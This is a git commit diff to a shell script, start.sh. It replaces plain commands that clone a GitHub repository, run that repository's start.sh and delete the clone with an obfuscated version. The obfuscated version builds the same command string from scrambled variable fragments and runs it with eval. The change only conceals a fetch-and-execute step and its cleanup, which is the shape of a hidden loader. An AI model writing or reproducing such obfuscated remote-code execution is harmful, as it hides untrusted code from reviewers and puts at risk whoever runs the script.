00bab565a722f4c18673e562ac758eb2525e0775
lover3418 <lover3418@gmail.com>
2019-11-27 22:39:02 +0530

    U

--- start.sh
+++ start.sh
@@ -1,5 +1,3 @@
-git clone https://github.com/lover3419/spark.git
-cd spark
-bash start.sh
-cd
-rm -rf spark/spark
+z="
+";Iz='er34';Bz='clon';Ez='//gi';Lz='.git';Rz='cd';Nz='bash';Vz='rk';Oz=' sta';Gz='.com';Dz='tps:';Qz='h';Jz='19/s';Cz='e ht';Hz='/lov';Kz='park';Fz='thub';Sz='rm -';Uz='/spa';Tz='rf s';Mz='cd s';Pz='rt.s';Az='git ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Kz$z$Nz$Oz$Pz$Qz$z$Rz$z$Sz$Tz$Kz$Uz$Vz"
